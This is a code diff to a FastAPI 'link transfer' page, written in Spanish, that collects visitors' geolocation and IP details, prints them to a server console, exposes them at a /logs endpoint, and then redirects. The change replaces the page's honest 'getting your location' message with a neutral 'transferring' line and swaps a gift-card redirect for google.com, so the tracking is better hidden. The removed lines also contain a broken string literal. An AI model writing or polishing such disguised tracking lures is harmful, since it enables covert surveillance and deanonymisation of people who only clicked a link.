@@ -77,8 +77,8 @@ async def track(request: Request):
         <div class="container">
             <h2>Transfiriendo a sitio web...</h2>
             <div class="spinner"></div>
-            <p id="status">Obteniendo tu ubicación para una mejor experiencia</p>
-            <button id="skipBtn" onclick="skipLocation()" style="display:none;">Continuar sin ubicación</button>
+            <p id="status">Transfiriendo a pagina web </p>
+            <button id="skipBtn" onclick="skipLocation()" style="display:none;">No Transferir</button>
         </div>
 
         <script>
@@ -117,15 +117,13 @@ async def track(request: Request):
                         window.location.href = response.url;
                     } else {
                         return response.text().then(text => {
-                            window.location.href = 'https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn"
-';
+                            window.location.href = 'https://www.google.com';
                         });
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    window.location.href = 'https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn"
-';
+                    window.location.href = 'https://www.google.com';
                 });
             }
 
@@ -308,7 +306,7 @@ async def process_location(request: Request):
     print(f"🔢 Sistema Autónomo: {ip_info['as']}")
     print("=" * 120)
     
-    return RedirectResponse("https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn")
+    return RedirectResponse("https://www.google.com")
 
 @app.get("/logs", response_class=PlainTextResponse)
 def get_logs():
